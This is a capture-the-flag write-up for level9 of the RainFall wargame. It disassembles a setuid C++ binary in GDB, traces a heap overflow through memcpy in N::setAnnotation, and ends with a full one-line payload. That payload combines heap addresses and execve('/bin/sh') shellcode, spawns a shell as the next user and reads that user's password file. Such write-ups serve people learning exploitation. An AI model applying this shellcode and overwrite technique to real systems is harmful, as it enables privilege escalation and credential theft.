```sh
level9@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 42
```
There is one excutable file **level9**, it does nothing. \
\
Run the binary file with GDB.
```sh
(gdb) info functions
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```
Oh we can see some c++ style functions, N class, N::N(int) constructor etc...
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp) # a
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp) # b
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)  # ebp + 0xc argv[1]
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp) # this
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax # 0x10 b    0x14 a
   0x08048680 <+140>:   mov    (%eax),%eax # address of start shell code
   0x08048682 <+142>:   mov    (%eax),%edx # shell code
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave  
   0x08048699 <+165>:   ret    
End of assembler dump.
```
This time we can find function call which is mangled like ```call   0x8048530 <_Znwj@plt>```, We can find original function like this.
```sh
(gdb) info functions
...
0x08048530  operator new(unsigned int)
...
(gdb) x/i 0x08048530
   0x8048530 <_Znwj@plt>:       jmp    *0x8049b70
```
We can define the function ```_Znwj``` was ```operator new()```. its produced by GNU gcc, for more information, [link](https://en.wikipedia.org/wiki/Name_mangling#:~:text=Complex%20example%5B,(Itanium)%20ABI%3A). \
\
We could find some function with vulnerability in ```setAnnotation()``` at line +37.
```sh
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc: # setAnnotation(this, av)
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax # 0xc = param 1
   0x08048717 <+9>:     mov    %eax,(%esp) #this = 자기자신 = esp,
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    0x8(%ebp),%edx # 0x8 = param 0
   0x08048722 <+20>:    add    $0x4,%edx
   0x08048725 <+23>:    mov    %eax,0x8(%esp)
   0x08048729 <+27>:    mov    0xc(%ebp),%eax
   0x0804872c <+30>:    mov    %eax,0x4(%esp)
   0x08048730 <+34>:    mov    %edx,(%esp)
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt> # here
   0x08048738 <+42>:    leave  
   0x08048739 <+43>:    ret    
End of assembler dump.
```
They use ```memcpy()``` who has vulnerability of buffer overflow, its calling in main function with some parameter. it can represent like :
```cpp
void setAnnotation()
{
	memcpy();
}
```
```sh
(gdb) disas main
   ...
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   ...
```
So basically, the main function has argc, argv and envp, and they are usual parameters passed to the function. \
According to this we can access these values as normal parameters. check the [stack frame role here](https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames). \
\
We can concentrate on the line +112, it takes ```0xc``` of ebp, this means it takes ```argv[1]```, and save itself with dereferenced value. \
On the line +124 and +128, it gets ```0x14``` of esp which is one of the instance ```N```, and points itself. \
It will be like:
```c++
N *n = new N();
n->setAnnotation(av[1]);
```
So we can verify where is buffer overflow with argument,
```sh
(gdb) r aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9
Starting program: /home/user/level9/level9 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x61366461       1630954593
ecx            0x3965   14693
edx            0x804a0a2        134520994
ebx            0x804a078        134520952
esp            0xbffff670       0xbffff670
ebp            0xbffff698       0xbffff698
```
it corruptes EAX, because
```sh
(gdb) disas main
   ...
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
=> 0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   ...
```
After calling the function at +131, we can see copying the value of 0x10 of esp in eax. remember this information.
```sh
level9@RainFall:~$ ltrace ./level9 BBBB
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) 	= 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) 				= 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)  						= 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280) 									= 0x804a078 #\x0c\xa0\04\x08
strlen("BBBB") 																		= 4
memcpy(0x804a00c, "BBBB", 4) 														= 0x804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) 			= 0xb7fce4a0
```
We can see ```memcpy()``` copies in address 0x804a00c,
```sh
(gdb) b *main+128
Breakpoint 1 at 0x8048674
(gdb) r AAAA
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x08048674 in main ()
(gdb) x $esp+0x10
0xbffff710:     0x0804a078
```
We check ESP address before enter the function ```memcpy()```, we can check its not far away from address of ```memcpy()```. \
Because of this, EAX was corrupted, at line main+136. \
\
The address of variable ```a``` is ```0x804a008``` and ```b``` is ```0x804a078``` \
difference between them is 112 (0x70). \
Knowing this we just have to simply buffer overflow the ```a```'s ```char annotation[100];``` variable by passing long string to ```av[1]```.
```sh
(gdb) disas 0x80486f6
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:     push   %ebp
   0x080486f7 <+1>:     mov    %esp,%ebp
   0x080486f9 <+3>:     mov    0x8(%ebp),%eax
   0x080486fc <+6>:     movl   $0x8048848,(%eax)
   0x08048702 <+12>:    mov    0x8(%ebp),%eax
   0x08048705 <+15>:    mov    0xc(%ebp),%edx
   0x08048708 <+18>:    mov    %edx,0x68(%eax) # memory space for int nb, char annotation[100]
   0x0804870b <+21>:    pop    %ebp
   0x0804870c <+22>:    ret
End of assembler dump.
```
```c++
a->setAnnotation(av[1]);
```
Since ```b```'s address (```0x804a078```) is now corrupted and changed to our desired address (```\x0c\xa0\04\x08```), \
the code will try to dereference twice:
```c++
return (b->*(b->func))(*a);
```
The flow of dereference is ... \
```\x0c\xa0\04\x08(start addr)``` -> ```\x10\xa0\x04\x08(start addr + 4)``` -> ```\x31\xc0\x50\x68...(shell code)```. \
\
So it will end with our exploitation shell code ```/bin/sh```.
```sh
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
(hidden)
```
level 9 passed !